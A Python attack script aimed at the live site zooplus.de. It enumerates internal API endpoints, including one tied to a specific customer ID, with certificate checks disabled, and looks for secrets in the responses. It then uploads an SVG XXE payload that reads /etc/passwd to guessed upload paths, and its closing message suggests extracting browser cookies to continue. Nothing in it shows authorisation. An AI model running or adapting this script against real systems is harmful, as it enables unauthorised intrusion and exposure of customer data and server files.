#!/usr/bin/env python3
"""Test found endpoints directly with proper cookies"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# Known endpoints from browser
endpoints = [
    "/semiprotected/api/audiences-api/v1/me",
    "/semiprotected/api/audiences-api/v1/sites/1/audiences",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/myaccount/api/customer-config/v1/customerconfiguration/53260633",
]

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

# Try to get session from browser cookies
# Note: In real scenario, extract cookies from browser
print("[*] Testing endpoints found in browser...")
print("[!] Note: Need real browser cookies for full testing\n")

found_vulns = []

# Test each endpoint
for ep in endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=5, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else resp.text
            print(f"  [OK] {ep} -> {resp.status_code}")
            
            # Check for sensitive data
            data_str = json.dumps(data) if isinstance(data, dict) else str(data)
            if any(key in data_str.lower() for key in ['password', 'secret', 'key', 'token']):
                print(f"      [HIGH] Contains sensitive data!")
                found_vulns.append({"type": "information_disclosure", "severity": "HIGH", "endpoint": ep})
        elif resp.status_code == 401:
            print(f"  [INFO] {ep} -> 401 (needs auth)")
        elif resp.status_code == 403:
            print(f"  [INFO] {ep} -> 403 (forbidden)")
    except: pass

# Test for upload endpoints variations
print("\n[*] Testing upload endpoint variations...")
upload_patterns = [
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/myaccount/api/upload",
    "/myaccount/api/avatar",
    "/semiprotected/api/upload",
    "/protected/api/upload",
]

svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'

for ep in upload_patterns:
    try:
        files = {'file': ('x.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text:
                print(f"  [CRITICAL] SVG XXE: {ep}")
                found_vulns.append({"type": "svg_xxe_lfi", "severity": "CRITICAL", "endpoint": ep})
            else:
                print(f"  [INFO] Upload accepted: {ep} -> {resp.status_code}")
    except: pass

if found_vulns:
    print(f"\n[+] Found {len(found_vulns)} vulnerabilities!")
    for v in found_vulns:
        print(f"  [{v['severity']}] {v['type']}: {v['endpoint']}")
else:
    print("\n[!] No vulnerabilities found - need browser cookies for full testing")

print("\n[*] Recommendation: Extract cookies from browser and test with them")

